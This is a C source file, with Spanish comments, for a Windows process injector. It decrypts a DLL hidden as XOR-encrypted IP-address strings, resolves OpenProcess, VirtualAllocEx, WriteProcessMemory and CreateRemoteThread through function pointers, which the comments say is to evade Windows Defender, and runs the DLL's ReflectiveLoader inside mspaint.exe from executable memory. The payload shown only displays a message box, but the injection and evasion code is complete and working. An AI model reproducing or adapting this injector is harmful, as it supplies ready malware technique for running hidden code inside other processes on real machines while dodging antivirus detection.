#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "shellcode.h"

#pragma comment(lib, "ws2_32.lib")

#define KEY "ASFASFASFASFDVGSVBCBCXCBXCBNKDJBJADFBAJBSFKJABANKFCAKC"

//definimos los prototipos de las funciones para poder usarlas mediante punteros y evadir análisis estático de windows defender
typedef HANDLE(WINAPI* FN_OpenProcess)(DWORD, BOOL, DWORD);
typedef LPVOID(WINAPI* FN_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* FN_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* FN_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

//estructura que le pasamos al inyector cuando ya está ejecutandose
typedef struct _INJECTION_ARGS {
    PVOID pMessageBoxA;
    char szTexto[128];
    char szTitulo[64];
} INJECTION_ARGS, *PINJECTION_ARGS;

//convertir dirección virtual relativa en offset
DWORD RvaToOffset(PIMAGE_NT_HEADERS pNt, DWORD rva) {
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (rva >= pSection[i].VirtualAddress && rva < pSection[i].VirtualAddress + pSection[i].Misc.VirtualSize) {
            return rva - pSection[i].VirtualAddress + pSection[i].PointerToRawData;
        }
    }
    return 0;
}

//revertir la cadena de ips a bytes
BOOL IpToBytes(const char* ip, BYTE out[4]) {
    int a, b, c, d;
    if (sscanf(ip, "%d.%d.%d.%d", &a, &b, &c, &d) != 4) return FALSE;
    out[0] = (BYTE)a; out[1] = (BYTE)b; out[2] = (BYTE)c; out[3] = (BYTE)d;
    return TRUE;
}

//Reconstruir dll ofuscada y convertida a direcciones ip
BYTE* ReconstructDLLFromIPs(SIZE_T* pOutSize) {
    SIZE_T totalBytes = shell_ips_count * 4;
    BYTE* encrypted = (BYTE*)malloc(totalBytes);
    if (!encrypted) return NULL;

    for (int i = 0; i < shell_ips_count; i++) {
        if (!IpToBytes(shell_ips[i], encrypted + i * 4)) {
            free(encrypted);
            return NULL;
        }
    }

    size_t key_len = strlen(KEY);
    for (SIZE_T i = 0; i < totalBytes; i++) {
        encrypted[i] = encrypted[i] ^ KEY[i % key_len] ^ (i & 0xFF);
    }

    SIZE_T realSize = totalBytes;
    while (realSize > 0 && encrypted[realSize - 1] == 0) realSize--;

    BYTE* dllData = (BYTE*)malloc(realSize);
    if (!dllData) {
        free(encrypted);
        return NULL;
    }
    memcpy(dllData, encrypted, realSize);
    free(encrypted);
    *pOutSize = realSize;
    return dllData;
}

//buscar el proceso paint y obtener su pid
DWORD GetPaintPid() {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { sizeof(pe) };
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (stricmp(pe.szExeFile, "mspaint.exe") == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

//buscar la funcion ReflectiveLoader en el Directorio de Exportación de la DLL
LPVOID GetReflectiveLoaderLocal(BYTE* dllData) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)dllData;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(dllData + pDos->e_lfanew);
    DWORD exportRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exportOffset = RvaToOffset(pNt, exportRVA);

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(dllData + exportOffset);
    DWORD* pNames = (DWORD*)(dllData + RvaToOffset(pNt, pExport->AddressOfNames));
    WORD* pOrdinals = (WORD*)(dllData + RvaToOffset(pNt, pExport->AddressOfNameOrdinals));
    DWORD* pFunctions = (DWORD*)(dllData + RvaToOffset(pNt, pExport->AddressOfFunctions));

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char* funcName = (char*)(dllData + RvaToOffset(pNt, pNames[i]));
        if (strcmp(funcName, "ReflectiveLoader") == 0) {
            DWORD funcOffset = RvaToOffset(pNt, pFunctions[pOrdinals[i]]);
            return (LPVOID)(dllData + funcOffset);
        }
    }
    return NULL;
}

int main() {
    //Reconstruimos dll
    SIZE_T dllSize;
    BYTE* dllData = ReconstructDLLFromIPs(&dllSize);
    if (!dllData) return 1;

    //localizamos entry point
    LPVOID pReflectiveLoaderLocal = GetReflectiveLoaderLocal(dllData);
    if (!pReflectiveLoaderLocal) { free(dllData); return 1; }

    //Comprobar que paint este abierto
    DWORD pid = GetPaintPid();
    if (pid == 0) {
        free(dllData);
        return 1;
    }

    //obtenemos dirección de kernel32.dll
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");

    //localizamos las funciones necesarias para gestionar procesos y memoria
    FN_OpenProcess pOpenProcess = (FN_OpenProcess)GetProcAddress(hKernel32, "OpenProcess");
    FN_VirtualAllocEx pVirtualAllocEx = (FN_VirtualAllocEx)GetProcAddress(hKernel32, "VirtualAllocEx");
    FN_WriteProcessMemory pWriteProcessMemory = (FN_WriteProcessMemory)GetProcAddress(hKernel32, "WriteProcessMemory");
    FN_CreateRemoteThread pCreateRemoteThread = (FN_CreateRemoteThread)GetProcAddress(hKernel32, "CreateRemoteThread");

    //abrimos proceso objetivp con los permisos
    HANDLE hProcess = pOpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid);
    if (!hProcess) { free(dllData); return 1; }

    //preparamos argumentos
    INJECTION_ARGS args = { 0 };
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    args.pMessageBoxA = (PVOID)GetProcAddress(hUser32, "MessageBoxA");
    strcpy(args.szTexto, "¡Inyección Exitosa!");
    strcpy(args.szTitulo, "Mensaje");

    //reservamos memoria y escribimos argumentos
    LPVOID pRemoteArgs = pVirtualAllocEx(hProcess, NULL, sizeof(INJECTION_ARGS), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    pWriteProcessMemory(hProcess, pRemoteArgs, &args, sizeof(INJECTION_ARGS), NULL);

    //reservamos memoria y escribimos dll con permisos RDX (tengo que ver como cambiarlo porque es sospechoso)
    LPVOID pRemoteDLL = pVirtualAllocEx(hProcess, NULL, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    pWriteProcessMemory(hProcess, pRemoteDLL, dllData, dllSize, NULL);

    //calculamos offset de ReflectiveLoader del inicio del archivo
    DWORD rvaLoader = (DWORD)((BYTE*)pReflectiveLoaderLocal - dllData);
    //sumamos el offset a la base de la DLL en el proceso para conseguir la dirección exacta de la función en paint
    LPVOID pRemoteFunc = (BYTE*)pRemoteDLL + rvaLoader;

    //crea el hilo remoto
    HANDLE hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteFunc, pRemoteArgs, 0, NULL);
    //verificamos que se ha creado
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE); //tiempo infinito para mis comprobaciones
        CloseHandle(hThread);
    }
    //limpiamos memoria
    CloseHandle(hProcess);
    free(dllData);
    return 0;
}